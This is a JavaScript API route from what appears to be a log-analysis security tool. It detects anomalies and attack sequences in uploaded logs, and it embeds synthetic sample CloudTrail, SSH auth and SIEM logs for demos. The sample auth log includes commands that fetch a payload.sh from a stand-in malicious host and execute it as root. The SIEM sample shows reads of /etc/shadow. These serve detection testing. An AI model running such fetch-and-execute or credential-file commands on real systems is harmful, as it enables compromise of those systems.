// analyze.js - Main API route - updated to include baseline analysis

import express from 'express';
import multer from 'multer';
import { parseFile } from '../parsers/index.js';
import { detectAnomalies } from '../analyzers/anomalyDetector.js';
import { detectSequences } from '../analyzers/sequenceDetector.js';
import { extractIndicators } from '../analyzers/indicatorExtractor.js';
import { calculateScore } from '../analyzers/scorer.js';
import { summarizeWithLLM } from '../llm/summarizer.js';
import { chunkEvents } from '../utils/chunker.js';
import { buildBaseline, detectBaselineDeviations, summarizeBaseline } from '../analyzers/baselineAnalyzer.js';

export const analyzeRouter = express.Router();

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 },
});

analyzeRouter.post('/analyze', upload.single('file'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }

    const { originalname, mimetype, buffer, size } = req.file;
    console.log(`Analyzing file: ${originalname} (${(size / 1024).toFixed(1)}KB)`);

    // Step 1: Parse
    const parseResult = parseFile(buffer, originalname, mimetype);
    const { events, confidence, format, meta } = parseResult;

    if (!events || events.length === 0) {
      return res.status(422).json({
        error: 'Could not parse any events from file',
        details: parseResult.error || 'No events found',
        format,
      });
    }

    console.log(`Parsed ${events.length} events with ${(confidence * 100).toFixed(0)}% confidence`);

    // Step 2: Chunk
    const chunks = chunkEvents(events, 500);

    // Step 3: Build baseline from ALL events
    const baseline = buildBaseline(events);
    const baselineDeviations = detectBaselineDeviations(events, baseline);
    const baselineSummary = summarizeBaseline(baseline);

    // Step 4: Rule-based analysis on ALL events
    const ruleAnomalies = detectAnomalies(events);
    const sequences = detectSequences(events);

    // Combine rule anomalies + baseline deviations
    const allAnomalies = [...ruleAnomalies, ...baselineDeviations];

    const indicators = extractIndicators(events);
    const score = calculateScore(allAnomalies, sequences, events);

    // Step 5: LLM enrichment
    const llmResult = await summarizeWithLLM({
      normalizedEvents: events.slice(0, 100),
      anomalies: allAnomalies,
      sequences,
      indicators,
      score,
      baseline: baselineSummary,
      totalEvents: events.length, // Pass real total
      mode: chunks.length > 1 ? 'chunked' : 'full',
    });

    // Step 6: Build response
    const response = {
      meta: {
        filename: originalname,
        format,
        totalEvents: events.length,
        parseConfidence: confidence,
        llmUsed: llmResult.llmUsed || false,
        llmConfidence: llmResult.confidence || 0,
        chunksProcessed: chunks.length,
        ...meta,
      },
      summary: llmResult.summary,
      anomalies: llmResult.enrichedAnomalies || allAnomalies,
      sequences: llmResult.enrichedSequences || sequences,
      indicators,
      score,
      baseline: baselineSummary,
      events: events.slice(0, 200),
      totalEvents: events.length,
    };

    return res.json(response);

  } catch (err) {
    console.error('Analysis error:', err);
    return res.status(500).json({
      error: 'Analysis failed',
      message: err.message,
    });
  }
});

analyzeRouter.post('/analyze/sample', async (req, res) => {
  try {
    const { sample } = req.body;
    const samples = {
      cloudtrail: getSampleCloudTrail(),
      authlog: getSampleAuthLog(),
      siem: getSampleSiem(),
    };

    const rawText = samples[sample];
    if (!rawText) {
      return res.status(400).json({ error: 'Unknown sample type' });
    }

    const buffer = Buffer.from(rawText, 'utf-8');
    const filename = sample === 'cloudtrail' ? 'sample.json' :
                     sample === 'siem' ? 'sample.csv' : 'sample.log';

    const parseResult = parseFile(buffer, filename, 'text/plain');
    const { events, confidence, format, meta } = parseResult;

    const baseline = buildBaseline(events);
    const baselineDeviations = detectBaselineDeviations(events, baseline);
    const baselineSummary = summarizeBaseline(baseline);
    const ruleAnomalies = detectAnomalies(events);
    const allAnomalies = [...ruleAnomalies, ...baselineDeviations];
    const sequences = detectSequences(events);
    const indicators = extractIndicators(events);
    const score = calculateScore(allAnomalies, sequences, events);

    const llmResult = await summarizeWithLLM({
      normalizedEvents: events.slice(0, 100),
      anomalies: allAnomalies,
      sequences,
      indicators,
      score,
      baseline: baselineSummary,
      totalEvents: events.length,
      mode: 'full',
    });

    return res.json({
      meta: {
        filename,
        format,
        totalEvents: events.length,
        parseConfidence: confidence,
        llmUsed: llmResult.llmUsed || false,
        llmConfidence: llmResult.confidence || 0,
        chunksProcessed: 1,
        ...meta,
      },
      summary: llmResult.summary,
      anomalies: llmResult.enrichedAnomalies || allAnomalies,
      sequences: llmResult.enrichedSequences || sequences,
      indicators,
      score,
      baseline: baselineSummary,
      events: events.slice(0, 200),
      totalEvents: events.length,
    });

  } catch (err) {
    console.error('Sample analysis error:', err);
    return res.status(500).json({ error: 'Sample analysis failed', message: err.message });
  }
});

function getSampleCloudTrail() {
  return JSON.stringify({
    Records: [
      { eventTime: '2024-01-15T10:23:45Z', eventName: 'ConsoleLogin', eventSource: 'signin.amazonaws.com', sourceIPAddress: '203.0.113.42', userAgent: 'Mozilla/5.0', userIdentity: { type: 'IAMUser', userName: 'alice' }, errorCode: 'Failed authentication' },
      { eventTime: '2024-01-15T10:24:10Z', eventName: 'ConsoleLogin', eventSource: 'signin.amazonaws.com', sourceIPAddress: '203.0.113.42', userAgent: 'Mozilla/5.0', userIdentity: { type: 'IAMUser', userName: 'alice' }, errorCode: 'Failed authentication' },
      { eventTime: '2024-01-15T10:24:55Z', eventName: 'ConsoleLogin', eventSource: 'signin.amazonaws.com', sourceIPAddress: '203.0.113.42', userAgent: 'Mozilla/5.0', userIdentity: { type: 'IAMUser', userName: 'alice' }, responseElements: { ConsoleLogin: 'Success' } },
      { eventTime: '2024-01-15T10:26:00Z', eventName: 'AssumeRole', eventSource: 'sts.amazonaws.com', sourceIPAddress: '203.0.113.42', userIdentity: { type: 'IAMUser', userName: 'alice' }, requestParameters: { roleArn: 'arn:aws:iam::123456789:role/AdminRole' } },
      { eventTime: '2024-01-15T10:27:30Z', eventName: 'PutRolePolicy', eventSource: 'iam.amazonaws.com', sourceIPAddress: '203.0.113.42', userIdentity: { type: 'IAMUser', userName: 'alice' }, requestParameters: { roleName: 'AdminRole', policyName: 'FullAccess' } },
      { eventTime: '2024-01-15T10:30:00Z', eventName: 'GetObject', eventSource: 's3.amazonaws.com', sourceIPAddress: '203.0.113.42', userIdentity: { type: 'IAMUser', userName: 'alice' }, resources: [{ ARN: 'arn:aws:s3:::sensitive-data-bucket/secrets.txt' }] },
      { eventTime: '2024-01-15T10:31:00Z', eventName: 'GetObject', eventSource: 's3.amazonaws.com', sourceIPAddress: '203.0.113.42', userIdentity: { type: 'IAMUser', userName: 'alice' }, resources: [{ ARN: 'arn:aws:s3:::sensitive-data-bucket/credentials.json' }], errorCode: 'AccessDenied' },
      { eventTime: '2024-01-15T10:32:00Z', eventName: 'CreateUser', eventSource: 'iam.amazonaws.com', sourceIPAddress: '203.0.113.42', userIdentity: { type: 'IAMUser', userName: 'alice' }, requestParameters: { userName: 'backdoor-user' } },
    ],
  });
}

function getSampleAuthLog() {
  return `Jan 15 10:00:01 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:05 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:09 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:13 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:17 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:21 webserver sshd[1234]: Failed password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:00:45 webserver sshd[1234]: Accepted password for bob from 192.168.1.100 port 22 ssh2
Jan 15 10:01:02 webserver sudo[5678]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Jan 15 10:01:15 webserver sudo[5679]: bob : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh
Jan 15 10:01:20 webserver sudo[5680]: bob : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 777 payload.sh
Jan 15 10:01:25 webserver sudo[5681]: bob : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash payload.sh
Jan 15 10:02:00 webserver sshd[9999]: Failed password for invalid user admin from 10.0.0.5 port 4444 ssh2
Jan 15 10:02:01 webserver sshd[9999]: Failed password for invalid user root from 10.0.0.5 port 4444 ssh2
Jan 15 10:02:02 webserver sshd[9999]: Failed password for invalid user administrator from 10.0.0.5 port 4444 ssh2`;
}

function getSampleSiem() {
  return `timestamp,user,src_ip,action,status,message,target
2024-01-15T09:00:00Z,carol,10.10.10.5,login,failure,Invalid credentials,vpn-gateway
2024-01-15T09:00:05Z,carol,10.10.10.5,login,failure,Invalid credentials,vpn-gateway
2024-01-15T09:00:10Z,carol,10.10.10.5,login,failure,Invalid credentials,vpn-gateway
2024-01-15T09:01:00Z,carol,10.10.10.5,login,success,Authentication successful,vpn-gateway
2024-01-15T09:05:00Z,carol,10.10.10.5,file_access,success,File read,/etc/passwd
2024-01-15T09:06:00Z,carol,10.10.10.5,file_access,success,File read,/etc/shadow
2024-01-15T09:07:00Z,carol,10.10.10.5,privilege_escalation,success,sudo su,root
2024-01-15T09:10:00Z,dave,172.16.0.1,login,success,Authentication successful,internal-app
2024-01-15T09:11:00Z,dave,172.16.0.1,data_export,success,Large file download,database-backup.sql
2024-01-15T09:15:00Z,eve,192.168.5.20,port_scan,failure,Connection refused,internal-network`;
}